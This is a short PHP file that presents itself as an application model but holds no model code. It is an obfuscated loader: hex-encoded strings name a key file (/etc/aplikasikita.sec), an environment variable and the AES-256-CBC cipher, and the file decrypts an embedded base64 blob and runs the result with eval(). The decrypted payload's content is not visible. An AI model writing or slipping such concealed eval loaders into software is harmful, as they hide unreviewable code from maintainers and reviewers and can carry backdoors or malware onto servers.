<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Fm44JosgQTyOeHgB6V6dZQ==');

$c=base64_decode(

'bNQUCeVlqcS7hp/RX0or3qZvd5KlyjSB6V5VTAOhS2gtfS/MBYyYBj0nnlnYFsy0fH9qu+o/46A5' .
'LDsw0cadrFLnZiRJmv+1FDFoIK8EcYGpTpLyKo7T4A7Rdrf8KJ4sAtEy2ml8qVV/3R/yBPUH3kSm' .
'JlsjZQjqsi1HQDLjDAl7BYCp7rCCcrjfdfQYRINCyDvaeGXIiC7SA6OQ+NDFfIjxaZIRNlMKajru' .
'H7AJRIaBlIfHTQEKpq+I0mfC+2hHKE/1UcYBP6W1bAX5Pl0cJGHXT88San1YhmAuuYyjxHYRDgw9' .
'9azZLGmkVU60HDDlWLGpgXbkAoeKroOGkxl/bYHvDP0qGrS+L/dTmEAloFsxTrKhQvrTYECzQZ8i' .
'uKjIQM1uV9hkCcWoXbSzqf27vX+qnzsLXXjMMwIwhX1gLlwpK1f8rmy8LtecHqZI6fxoNgRL6Ll7' .
'fctjInXT+XY3Ok9eFYPolHtmFucz/Uz+qj0YYqwMZDnnZkb7vdQ9or09Ici3R0JVHVDw2tDyzfaT' .
'm1sazOXBCW8NRnbK3wzIQWUBJn4296S5jH+zovsh8Lf+Z4bHD5b1ayvk7J8c24glGRftYtZ38pfB' .
'e90xYmeykWLPTEemy//eMLP7sWBJr5Lh7Lsxf2pS9s3Ef26xStuezqwFmMMsqxJ2q/GF3YPp9MCh' .
'XBOHbulUYM7BhrGCo+BYgxfW0kRt+PgSece/pWCZhf9a4v0xp8iPF0iTBGuTjTcxKEKoyEEyoNwf' .
'll086/9DbjzOmtLiir5Em77cMXQYWpt5rrPIhH6AEaqaqypapUrJc1VYrSuPFsiCp32rw2UDpu+l' .
'o4v3QfeJk4DRofTNpMyV+6RPuJCkCw5bse1/r3QbuiXYX0Q3Cu7FT1ZKCvjJ'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

